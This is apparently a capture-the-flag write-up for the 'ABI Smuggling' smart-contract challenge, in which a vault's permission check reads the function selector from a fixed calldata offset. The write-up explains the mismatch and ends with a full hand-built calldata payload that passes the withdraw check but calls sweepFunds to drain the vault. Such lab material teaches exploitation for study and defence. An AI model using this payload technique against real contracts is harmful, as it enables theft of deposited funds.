# ABI Smuggling

There’s a permissioned vault with 1 million DVT tokens deposited. The vault allows withdrawing funds periodically, as well as taking all funds out in case of emergencies.

The contract has an embedded generic authorization scheme, only allowing known accounts to execute specific actions.

The dev team has received a responsible disclosure saying all funds can be stolen.

Rescue all funds from the vault, transferring them to the designated recovery account.



## solution
The key vulnerability lies in how the selector is extracted from calldata versus how the function call is actually executed:

The execute function extracts a selector from a fixed position in calldata (offset 100) for permission checking
But it passes the entire actionData parameter to target.functionCall(actionData) for execution
This creates a potential mismatch between what's being checked for permissions and what's actually being executed.

The key insight is that you need to craft the actionData in a way that:

The first 4 bytes at calldata position 100 are the withdraw selector (0xd9caed12), which the player has permission to call. But the actual data passed to functionCall should execute the sweepFunds function.

You could potentially craft the actionData to include the withdraw selector at the beginning (which will be at position 100 in the raw calldata and pass the permission check), but structure the rest of the data to actually call sweepFunds when executed.

This is a classic ABI smuggling attack where you're exploiting the discrepancy between how the function extracts and validates the selector versus how it actually executes the function call.

The challenge is to craft the actionData parameter in a way that it passes the permission check for withdraw but actually executes sweepFunds when passed to functionCall.


```
1cff79cd                                                            execute selector
0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264    address vault
0000000000000000000000000000000000000000000000000000000000000080    offset - start of actiondata
0000000000000000000000000000000000000000000000000000000000000000    emptydata to move withdraw selector to 100
d9caed1200000000000000000000000000000000000000000000000000000000    withdraw selector
0000000000000000000000000000000000000000000000000000000000000044    actiondatalength (decimal 68)
85fb709d                                                            sweepfunds selector (actiondata starts here)
00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea    address recovery
0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b    address dvt token
```